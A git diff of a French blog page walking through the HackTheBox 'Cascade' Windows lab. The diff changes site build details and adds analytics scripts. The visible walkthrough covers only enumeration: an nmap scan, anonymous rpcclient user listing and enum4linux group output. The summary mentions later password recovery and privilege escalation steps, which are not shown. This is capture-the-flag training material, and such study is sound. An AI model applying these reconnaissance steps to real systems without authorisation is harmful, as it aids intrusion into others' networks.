@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="Cascade est une machine Windows considérée comme facile/moyenne. Un accès RPC anonyme permet de récupérer des infos sur les utilisateurs du domaine et une recherche anonyme via LDAP permet de récupérer un mot de passe via un des attribut d&rsquo;un compte. Par la suite, l&rsquo;énumération des partages SMB et des fichiers accessibles révèle un fichier de configuration VNC dans lequel il est possible de récupérer un second mot de passe. Cet utilisateur ayant plus de droits, il est possible de découvrir un binaire. Ce dernier utilise un compte de service d&rsquo;intérêt. Une retro-ingéniérie rapide permet de récupérer le mot de passe. L&rsquo;escalade de privilège est réalisée au travers d&rsquo;un compte particulier censé être supprimé." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/fr/walkthroughs/hackthebox/cascade/" />
-<meta property="article:published_time" content="2020-08-20T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2020-08-20T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2020-08-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-08-20T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/en/walkthroughs/hackthebox/cascade/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,38 +230,34 @@
   </header>
   <div class="post">
     <p>Cascade est une machine Windows considérée comme facile/moyenne. Un accès RPC anonyme permet de récupérer des infos sur les utilisateurs du domaine et une recherche anonyme via LDAP permet de récupérer un mot de passe via un des attribut d&rsquo;un compte. Par la suite, l&rsquo;énumération des partages SMB et des fichiers accessibles révèle un fichier de configuration VNC dans lequel il est possible de récupérer un second mot de passe. Cet utilisateur ayant plus de droits, il est possible de découvrir un binaire. Ce dernier utilise un compte de service d&rsquo;intérêt. Une retro-ingéniérie rapide permet de récupérer le mot de passe. L&rsquo;escalade de privilège est réalisée au travers d&rsquo;un compte particulier censé être supprimé.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
-<h2 id="découverte-énumération">Découverte / Énumération</h2>
-
+<h2 id="découverte--énumération">Découverte / Énumération</h2>
 <p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.182 
 
-<pre><code class="language-bash">$ sudo nmap -sS -p 0-10000 -T4 -sV -sC default -O -v -oN scan_nmap 10.10.10.182 
-
-Nmap scan report for 10.10.10.182
-Host is up (0.13s latency).
-Not shown: 9991 filtered ports
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.182
+Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">9991</span> filtered ports
 PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+53/tcp   open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
 | dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-11 12:42:51Z)
+|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-04-11 12:42:51Z<span style="color:#f92672">)</span>
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
 445/tcp  open  microsoft-ds?
 636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
 3269/tcp open  tcpwrapped
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 (90%)
-No exact OS matches for host (test conditions non-ideal).
-Uptime guess: 0.009 days (since Sat Apr 11 14:31:28 2020)
-TCP Sequence Prediction: Difficulty=251 (Good luck!)
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> SP2 or <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP0 or SP1, Windows Server <span style="color:#ae81ff">2008</span> SP1, or Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows Vista SP2, Windows <span style="color:#ae81ff">7</span> SP1, or Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Uptime guess: 0.009 days <span style="color:#f92672">(</span>since Sat Apr <span style="color:#ae81ff">11</span> 14:31:28 2020<span style="color:#f92672">)</span>
+TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">251</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
 IP ID Sequence Generation: Incremental
 Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
 
@@ -255,173 +277,159 @@ Initiating NSE at 14:43
 Completed NSE at 14:43, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 541.01 seconds
-           Raw packets sent: 30274 (1.336MB) | Rcvd: 242 (11.308KB)
-</code></pre>
-
-<p>Les ports classiques d&rsquo;une machine Windows sont ouverts. Pas de ports exotiques.
-<br/></p>
-
-<h3 id="énumération-anonyme-premier-accès">Énumération anonyme &amp; premier accès</h3>
-
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 541.01 seconds
+           Raw packets sent: <span style="color:#ae81ff">30274</span> <span style="color:#f92672">(</span>1.336MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">242</span> <span style="color:#f92672">(</span>11.308KB<span style="color:#f92672">)</span>
+</code></pre></div><p>Les ports classiques d&rsquo;une machine Windows sont ouverts. Pas de ports exotiques.
+<!-- raw HTML omitted --></p>
+<h3 id="énumération-anonyme--premier-accès">Énumération anonyme &amp; premier accès</h3>
 <p>On tente premièrement de se connecter en anonyme au service RPC et d&rsquo;énumérer les utilisateurs du domaine.</p>
-
-<pre><code class="language-bash">$ rpcclient -U &quot;&quot; 10.10.10.182
-Enter WORKGROUP\'s password: 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.10.10.182
+Enter WORKGROUP<span style="color:#ae81ff">\&#39;</span>s password: 
 rpcclient $&gt; enumdomusers
-user:[CascGuest] rid:[0x1f5]
-user:[arksvc] rid:[0x452]
-user:[s.smith] rid:[0x453]
-user:[r.thompson] rid:[0x455]
-user:[util] rid:[0x457]
-user:[j.wakefield] rid:[0x45c]
-user:[s.hickson] rid:[0x461]
-user:[j.goodhand] rid:[0x462]
-user:[a.turnbull] rid:[0x464]
-user:[e.crowe] rid:[0x467]
-user:[b.hanson] rid:[0x468]
-user:[d.burman] rid:[0x469]
-user:[BackupSvc] rid:[0x46a]
-user:[j.allen] rid:[0x46e]
-user:[i.croft] rid:[0x46f]
-</code></pre>
-
-<p>Cela étant possible, on peut automatiser l&rsquo;extraction d&rsquo;informations à l&rsquo;aide de <code>enum4linux</code>. La sortie ci-dessous est tronquée afin de ne garder qu&rsquo;une partie des informations intéressantes. L&rsquo;énumération étant une des phases clé lors de ce type d&rsquo;exercie, on souhaite connaître les utilisateurs, les groupes et les relations d&rsquo;appartenances entre ces derniers.</p>
-
-<pre><code class="language-bash">$ enum4linux 10.10.10.182
+user:<span style="color:#f92672">[</span>CascGuest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>arksvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x452<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>s.smith<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x453<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>r.thompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x455<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>util<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.wakefield<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45c<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>s.hickson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x461<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.goodhand<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x462<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>a.turnbull<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>e.crowe<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>b.hanson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>d.burman<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>BackupSvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.allen<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>i.croft<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
+</code></pre></div><p>Cela étant possible, on peut automatiser l&rsquo;extraction d&rsquo;informations à l&rsquo;aide de <code>enum4linux</code>. La sortie ci-dessous est tronquée afin de ne garder qu&rsquo;une partie des informations intéressantes. L&rsquo;énumération étant une des phases clé lors de ce type d&rsquo;exercie, on souhaite connaître les utilisateurs, les groupes et les relations d&rsquo;appartenances entre ces derniers.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ enum4linux 10.10.10.182
 
 ...
 
-[+] Getting builtin group memberships:
-Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
-Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
-Group 'Users' (RID: 545) has member: CASCADE\Domain Users
-Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
-Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
-Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
-Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting builtin group memberships:
+Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\I</span>NTERACTIVE
+Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
+Group <span style="color:#e6db74">&#39;Users&#39;</span> <span style="color:#f92672">(</span>RID: 545<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Users
+Group <span style="color:#e6db74">&#39;Guests&#39;</span> <span style="color:#f92672">(</span>RID: 546<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ascGuest
+Group <span style="color:#e6db74">&#39;Guests&#39;</span> <span style="color:#f92672">(</span>RID: 546<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Guests
+Group <span style="color:#e6db74">&#39;Pre-Windows 2000 Compatible Access&#39;</span> <span style="color:#f92672">(</span>RID: 554<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
+Group <span style="color:#e6db74">&#39;Windows Authorization Access Group&#39;</span> <span style="color:#f92672">(</span>RID: 560<span style="color:#f92672">)</span> has member: NT AUTHORITY<span style="color:#ae81ff">\E</span>NTERPRISE DOMAIN CONTROLLERS
 
-[+] Getting local groups:
-group:[Cert Publishers] rid:[0x205]
-group:[RAS and IAS Servers] rid:[0x229]
-group:[Allowed RODC Password Replication Group] rid:[0x23b]
-group:[Denied RODC Password Replication Group] rid:[0x23c]
-group:[DnsAdmins] rid:[0x44e]
-group:[IT] rid:[0x459]
-group:[Production] rid:[0x45a]
-group:[HR] rid:[0x45b]
-group:[AD Recycle Bin] rid:[0x45f]
-group:[Backup] rid:[0x460]
-group:[Temps] rid:[0x463]
-group:[WinRMRemoteWMIUsers__] rid:[0x465]
-group:[Remote Management Users] rid:[0x466]
-group:[Factory] rid:[0x46c]
-group:[Finance] rid:[0x46d]
-group:[Audit Share] rid:[0x471]
-group:[Data Share] rid:[0x472]
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting local groups:
+group:<span style="color:#f92672">[</span>Cert Publishers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x205<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>RAS and IAS Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x229<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Allowed RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23b<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Denied RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23c<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>DnsAdmins<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44e<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>IT<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x459<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Production<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45a<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>HR<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45b<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>AD Recycle Bin<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45f<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Backup<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x460<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Temps<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>WinRMRemoteWMIUsers__<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Remote Management Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Factory<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Finance<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46d<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Audit Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Data Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
 
-[+] Getting local group memberships:
-Group 'IT' (RID: 1113) has member: CASCADE\arksvc
-Group 'IT' (RID: 1113) has member: CASCADE\s.smith
-Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
-Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
-Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users
-Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
-Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
-Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
-Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
-Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting local group memberships:
+Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
+Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
+Group <span style="color:#e6db74">&#39;IT&#39;</span> <span style="color:#f92672">(</span>RID: 1113<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\r</span>.thompson
+Group <span style="color:#e6db74">&#39;HR&#39;</span> <span style="color:#f92672">(</span>RID: 1115<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.hickson
+Group <span style="color:#e6db74">&#39;Data Share&#39;</span> <span style="color:#f92672">(</span>RID: 1138<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Users
+Group <span style="color:#e6db74">&#39;Audit Share&#39;</span> <span style="color:#f92672">(</span>RID: 1137<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
+Group <span style="color:#e6db74">&#39;Remote Management Users&#39;</span> <span style="color:#f92672">(</span>RID: 1126<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
+Group <span style="color:#e6db74">&#39;Remote Management Users&#39;</span> <span style="color:#f92672">(</span>RID: 1126<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\k</span>rbtgt
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Controllers
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\S</span>chema Admins
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\E</span>nterprise Admins
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\C</span>ert Publishers
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\D</span>omain Admins
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\G</span>roup Policy Creator Owners
+Group <span style="color:#e6db74">&#39;Denied RODC Password Replication Group&#39;</span> <span style="color:#f92672">(</span>RID: 572<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\R</span>ead-only Domain Controllers
+Group <span style="color:#e6db74">&#39;AD Recycle Bin&#39;</span> <span style="color:#f92672">(</span>RID: 1119<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
 
-[+] Getting domain groups:
-group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-group:[Domain Users] rid:[0x201]
-group:[Domain Guests] rid:[0x202]
-group:[Domain Computers] rid:[0x203]
-group:[Group Policy Creator Owners] rid:[0x208]
-group:[DnsUpdateProxy] rid:[0x44f]
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting domain groups:
+group:<span style="color:#f92672">[</span>Enterprise Read-only Domain Controllers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f2<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Domain Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x201<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Domain Guests<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x202<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Domain Computers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x203<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Group Policy Creator Owners<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x208<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>DnsUpdateProxy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44f<span style="color:#f92672">]</span>
 
-[+] Getting domain group memberships:
-Group 'Domain Users' (RID: 513) has member: CASCADE\administrator
-Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt
-Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc
-Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
-Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
-Group 'Domain Users' (RID: 513) has member: CASCADE\util
-Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield
-Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson
-Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand
-Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull
-Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe
-Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson
-Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman
-Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc
-Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen
-Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft
-Group 'Group Policy Creator Owners' (RID: 520) has member: CASCADE\administrator
-Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting domain group memberships:
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>dministrator
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\k</span>rbtgt
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\a</span>rksvc
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\s</span>.smith
+Group <span style="color:#e6db74">&#39;Domain Users&#39;</span> <span style="color:#f92672">(</span>RID: 513<span style="color:#f92672">)</span> has member: CASCADE<span style="color:#ae81ff">\r</span>.thompson
